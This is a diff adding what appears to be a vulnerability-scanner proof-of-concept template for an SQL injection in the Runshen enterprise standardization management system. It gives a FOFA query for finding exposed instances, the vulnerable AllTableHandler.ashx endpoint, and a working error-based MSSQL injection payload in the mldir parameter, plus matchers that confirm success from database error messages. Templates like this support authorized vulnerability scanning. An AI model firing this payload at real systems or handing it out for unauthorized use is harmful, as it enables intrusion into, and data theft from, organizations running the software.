@@ -1,0 +1,20 @@
+id: poc-yaml-run-shen-information-esms-alltablehandler-ashx-sqli
+info:
+  name: 润申信息企业标准化管理系统 AllTableHandler.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企业标准化管理系统
+  fofa: body="企业标准化管理系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /PDCA/ashx/AllTableHandler.ashx?action=GetAll
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: IsOrder=4&mldir=%28SELECT+CONCAT%28CONCAT%28sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%2C%28CASE+WHEN+%287759%3D7759%29+THEN+CHAR%2832%29+ELSE+CHAR%2848%29+END%29%29%2CCHAR%2832%29%29%29&zydir=&code=&status=1%2C2%2C3%2C4&page=1&rows=30
+  expression: "status_code == 500 && \ncontains(body,\"0x\" + t2) &&\ncontains(body,\"\
+    &nbsp\") &&\nmatches(body,\"转换成数据类型(.*?)时失败\") &&\nmatches(body,\"在将(.*?)值\")\n"
+transport: http
